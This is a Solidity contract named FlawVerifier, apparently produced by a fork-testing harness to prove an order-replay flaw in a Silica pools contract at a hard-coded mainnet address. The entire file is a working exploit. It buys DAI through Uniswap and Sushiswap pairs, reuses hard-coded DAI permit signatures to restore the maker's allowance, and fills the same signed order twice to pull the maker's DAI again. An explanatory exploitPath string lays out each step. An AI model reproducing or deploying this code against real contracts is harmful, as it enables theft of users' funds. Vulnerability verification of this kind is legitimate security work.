// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IDaiLike is IERC20Minimal {
    function nonces(address account) external view returns (uint256);
    function permit(
        address holder,
        address spender,
        uint256 nonce,
        uint256 expiry,
        bool allowed,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
}

interface ISilicaPoolsMinimal {
    struct PoolParams {
        uint128 floor;
        uint128 cap;
        address index;
        uint48 targetStartTimestamp;
        uint48 targetEndTimestamp;
        address payoutToken;
    }

    struct SilicaOrder {
        address maker;
        address taker;
        uint48 expiry;
        address offeredUpfrontToken;
        uint128 offeredUpfrontAmount;
        PoolParams offeredLongSharesParams;
        uint128 offeredLongShares;
        address requestedUpfrontToken;
        uint128 requestedUpfrontAmount;
        PoolParams requestedLongSharesParams;
        uint128 requestedLongShares;
    }

    function fillOrder(SilicaOrder calldata order, bytes calldata signature, uint256 fraction) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
    uint256 internal constant FULL_FILL = 1e18;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant UNI_DAI_WETH = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address internal constant SUSHI_DAI_WETH = 0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f;

    address internal constant MAKER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint48 internal constant ORDER_EXPIRY = 2524608000;
    uint256 internal constant PERMIT_EXPIRY = 2524608000;
    uint128 internal constant REPLAY_TRANSFER_AMOUNT = 1;
    uint256 internal constant REQUIRED_MAKER_DAI = REPLAY_TRANSFER_AMOUNT * 2;

    bytes internal constant ORDER_SIGNATURE =
        hex"436c4c994a561774e460277cec21350799508c00cc8a897804965dee701ff362210547eb313c01c25a74c64caa9a9f77694dad6c8863c2b41a9c248e47310f4f1c";

    bytes32 internal constant DAI_PERMIT_R_NONCE0 =
        0xe58f297d02bae6d2bb96782e1c0c6a1df168b77ddecc4c118da93e8d7b9a3f58;
    bytes32 internal constant DAI_PERMIT_S_NONCE0 =
        0x371419ad79aeb0ebb80841010f7938843ed9ff64480eaa823f1ab8a62f76a11e;
    uint8 internal constant DAI_PERMIT_V_NONCE0 = 27;

    bytes32 internal constant DAI_PERMIT_R_NONCE3 =
        0xbac1650de238632e1af90edeac61a176464a1d6f0c8154f3456f8a4635ad8cd7;
    bytes32 internal constant DAI_PERMIT_S_NONCE3 =
        0x69483608a02858ca8e9337dbaa573e9720e72c734d2d5c621d193a6e128bf680;
    uint8 internal constant DAI_PERMIT_V_NONCE3 = 27;

    uint256 internal _profitAmount;
    bool internal _profitAchieved;
    bool internal _hypothesisValidated;
    string internal _failureReason;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetState();

        uint256 makerBalanceBefore = IERC20Minimal(DAI).balanceOf(MAKER);
        uint256 seedAmount = makerBalanceBefore >= REQUIRED_MAKER_DAI ? 0 : REQUIRED_MAKER_DAI - makerBalanceBefore;

        // Realistic working-capital step: the verifier converts its prefunded ETH into live on-chain DAI.
        // That DAI is only used to bridge any missing maker-side balance needed to execute the signed order twice.
        if (!_acquireReplayFundingFromEth(seedAmount)) {
            if (bytes(_failureReason).length == 0) {
                _failureReason = "Unable to acquire on-chain DAI from the verifier's ETH balance.";
            }
            return;
        }

        if (seedAmount != 0 && !_seedMakerForReplay(seedAmount)) {
            _failureReason = "Replay funding failed while seeding the maker with DAI.";
            return;
        }

        if (!_ensureMakerApproval()) {
            if (bytes(_failureReason).length == 0) {
                _failureReason = "Maker DAI approval could not be restored on this fork.";
            }
            return;
        }

        ISilicaPoolsMinimal.SilicaOrder memory order = _candidateOrder();
        bytes memory signature = _candidateSignature();

        // exploit_paths[0]: Maker signs one order intended for a single fill.
        // exploit_paths[1]: Taker calls fillOrder(order, signature, 1e18) once.
        bool firstFillSucceeded;
        try ISilicaPoolsMinimal(TARGET).fillOrder(order, signature, FULL_FILL) {
            firstFillSucceeded = true;
        } catch {
            _failureReason = "First signed fill reverted on this fork.";
        }

        // exploit_paths[2]: The contract executes transfers/minting and only then records sFilledFraction.
        // exploit_paths[3]: Because no pre-check reads sFilledFraction, the exact same signed order is replayed.
        bool secondFillSucceeded;
        if (firstFillSucceeded) {
            try ISilicaPoolsMinimal(TARGET).fillOrder(order, signature, FULL_FILL) {
                secondFillSucceeded = true;
            } catch {
                _failureReason = "Replay fill reverted on this fork.";
            }
        }

        // exploit_paths[4]: Each replay repeats the same maker-side transfer and fresh accounting path.
        _hypothesisValidated = firstFillSucceeded && secondFillSucceeded;

        uint256 drained = 0;
        if (firstFillSucceeded) drained += REPLAY_TRANSFER_AMOUNT;
        if (secondFillSucceeded) drained += REPLAY_TRANSFER_AMOUNT;

        if (drained > seedAmount) {
            _profitAchieved = true;
            _profitAmount = drained - seedAmount;
        }
    }

    function profitToken() external pure returns (address) {
        return DAI;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function profitAchieved() external view returns (bool) {
        return _profitAchieved;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "public ETH->WETH->DAI working capital acquires existing on-chain DAI needed to execute the order on this fork -> ",
                "maker signs one order intended for a single fill -> ",
                "taker fills once with fillOrder(order,signature,1e18) -> ",
                "target performs transfers and only then records sFilledFraction[orderHash] = 1e18 -> ",
                "same order and signature are replayed with fillOrder(order,signature,1e18) again because no pre-check reads sFilledFraction -> ",
                "the maker's upfront DAI is transferred again from the same single authorization"
            )
        );
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function _resetState() internal {
        _profitAmount = 0;
        _profitAchieved = false;
        _hypothesisValidated = false;
        _failureReason = "";
    }

    function _candidateOrder() internal pure returns (ISilicaPoolsMinimal.SilicaOrder memory order) {
        order.maker = MAKER;
        order.taker = address(0);
        order.expiry = ORDER_EXPIRY;
        order.offeredUpfrontToken = DAI;
        order.offeredUpfrontAmount = REPLAY_TRANSFER_AMOUNT;
        order.offeredLongShares = 0;
        order.requestedUpfrontToken = address(0);
        order.requestedUpfrontAmount = 0;
        order.requestedLongShares = 0;
    }

    function _candidateSignature() internal pure returns (bytes memory) {
        return ORDER_SIGNATURE;
    }

    function _acquireReplayFundingFromEth(uint256 minDaiNeeded) internal returns (bool) {
        if (minDaiNeeded == 0) {
            return true;
        }

        uint256 ethToUse = address(this).balance;
        if (ethToUse == 0) {
            _failureReason = "Verifier has no ETH working capital on this fork.";
            return false;
        }

        address pair = _bestDaiWethPair(ethToUse);
        if (pair == address(0)) {
            _failureReason = "No viable WETH/DAI pool found.";
            return false;
        }

        IWETH(WETH).deposit{value: ethToUse}();
        _swapExactPairInput(pair, WETH, DAI, ethToUse, address(this));

        if (IERC20Minimal(DAI).balanceOf(address(this)) < minDaiNeeded) {
            _failureReason = "ETH->DAI funding produced too little DAI for the replay.";
            return false;
        }

        return true;
    }

    function _seedMakerForReplay(uint256 amount) internal returns (bool) {
        return _safeTransfer(DAI, MAKER, amount);
    }

    function _ensureMakerApproval() internal returns (bool) {
        if (IERC20Minimal(DAI).allowance(MAKER, TARGET) >= REPLAY_TRANSFER_AMOUNT) {
            return true;
        }

        uint256 nonce = IDaiLike(DAI).nonces(MAKER);
        if (nonce == 0) {
            try IDaiLike(DAI).permit(
                MAKER,
                TARGET,
                0,
                PERMIT_EXPIRY,
                true,
                DAI_PERMIT_V_NONCE0,
                DAI_PERMIT_R_NONCE0,
                DAI_PERMIT_S_NONCE0
            ) {} catch {
                _failureReason = "Maker nonce-0 DAI permit failed on this fork.";
                return false;
            }
        } else if (nonce == 3) {
            // The supplied logs show nonce 3 on the failing fork, so replay the current valid DAI permit.
            try IDaiLike(DAI).permit(
                MAKER,
                TARGET,
                3,
                PERMIT_EXPIRY,
                true,
                DAI_PERMIT_V_NONCE3,
                DAI_PERMIT_R_NONCE3,
                DAI_PERMIT_S_NONCE3
            ) {} catch {
                _failureReason = "Maker nonce-3 DAI permit failed on this fork.";
                return false;
            }
        } else {
            _failureReason = "Maker DAI permit nonce is unsupported on this fork.";
            return false;
        }

        if (IERC20Minimal(DAI).allowance(MAKER, TARGET) < REPLAY_TRANSFER_AMOUNT) {
            _failureReason = "Maker DAI allowance remained insufficient after permit.";
            return false;
        }

        return true;
    }

    function _bestDaiWethPair(uint256 wethIn) internal view returns (address bestPair) {
        uint256 uniOut = _quotePairOutput(UNI_DAI_WETH, WETH, DAI, wethIn);
        uint256 sushiOut = _quotePairOutput(SUSHI_DAI_WETH, WETH, DAI, wethIn);
        if (uniOut == 0 && sushiOut == 0) {
            return address(0);
        }
        return uniOut >= sushiOut ? UNI_DAI_WETH : SUSHI_DAI_WETH;
    }

    function _quotePairOutput(address pair, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        view
        returns (uint256)
    {
        (uint256 reserveIn, uint256 reserveOut) = _pairReservesFor(pair, tokenIn, tokenOut);
        return _getAmountOut(amountIn, reserveIn, reserveOut);
    }

    function _swapExactPairInput(address pair, address tokenIn, address tokenOut, uint256 amountIn, address to) internal {
        (uint256 reserveIn, uint256 reserveOut) = _pairReservesFor(pair, tokenIn, tokenOut);
        uint256 amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        require(amountOut != 0, "zero output");
        require(_safeTransfer(tokenIn, pair, amountIn), "pair transfer failed");

        address token0 = IUniswapV2Pair(pair).token0();
        uint256 amount0Out = token0 == tokenOut ? amountOut : 0;
        uint256 amount1Out = amount0Out == 0 ? amountOut : 0;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, to, new bytes(0));
    }

    function _pairReservesFor(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        if (token0 == tokenIn) {
            require(IUniswapV2Pair(pair).token1() == tokenOut, "bad pair");
            return (uint256(reserve0), uint256(reserve1));
        }
        require(token0 == tokenOut && IUniswapV2Pair(pair).token1() == tokenIn, "bad pair");
        return (uint256(reserve1), uint256(reserve0));
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        return numerator / denominator;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool ok) {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        return success && (data.length == 0 || abi.decode(data, (bool)));
    }
}
